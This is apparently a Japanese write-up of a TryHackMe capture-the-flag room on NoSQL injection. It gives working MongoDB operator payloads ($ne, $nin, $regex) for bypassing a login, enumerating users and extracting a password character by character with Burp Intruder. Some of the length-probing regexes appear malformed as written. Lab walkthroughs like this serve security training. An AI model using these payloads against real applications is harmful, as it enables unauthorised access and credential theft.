# NoSQL Injection Tutorial
https://tryhackme.com/room/nosqlinjectiontutorial

## Task1
MongoDBで使用できるQuery  
https://docs.mongodb.com/manual/reference/operator/query/

比較
- `$eq` =
- `$ne` !=
- `$gt` >
- `$lt` <
 
その他いろいろある
- `$nin` not in an array
- `$regex` 正規表現

## Task2
設問なし

## Task3
元のPOSTリクエストBODY
> user=hoge&pass=fuga

ユーザ、パスともに不一致を条件にして実行
> user`[$ne]`=hoge&pass`[$ne]`=fuga

DBから返却された一番上のユーザ（admin）で認証に成功する

## Task4
`$nin`を使用し、adminではないユーザを調べる。  
> user`[$nin][]`=admin&pass[$ne]=fuga

リストなので、複数指定することも可能。
> user`[$nin][]`=admin&user`[$nin][]`=pedro&pass[$ne]=fuga

## Task5
正規表現を使用し、パスワードが何文字か特定する。
> user=pedro&pass`[$regex]`=`^{8}$`  
> user=pedro&pass`[$regex]`=`^{7}$`  
> user=pedro&pass`[$regex]`=`^{6}$`  
> user=pedro&pass`[$regex]`=`^{5}$`  

文字数を特定したら、先頭から1文字ずつ試して特定していく。
> user=pedro&pass`[$regex]`=`^a....$`  
> user=pedro&pass`[$regex]`=`^b....$`  
> user=pedro&pass`[$regex]`=`^c....$`  
> user=pedro&pass`[$regex]`=`^d....$`  
> user=pedro&pass`[$regex]`=`^e....$`

### BurpのIntruderを使用して、少しだけ効率化する。  
Positionsで、書き換えたい箇所を`§`で囲う。
> user=pedro&pass[$regex]=^§a§....$

Payloadsで英数字1文字だけのSimple listをセットする。
```
0
1
2
:
8
9
a
b
c
:
x
y
z
```

1文字特定したら2文字目に移る…を繰り返し。
> user=pedro&pass[$regex]=^1§a§...$

得られたパスワードを使用してSSH接続するとフラグが置かれていて、それが正解。
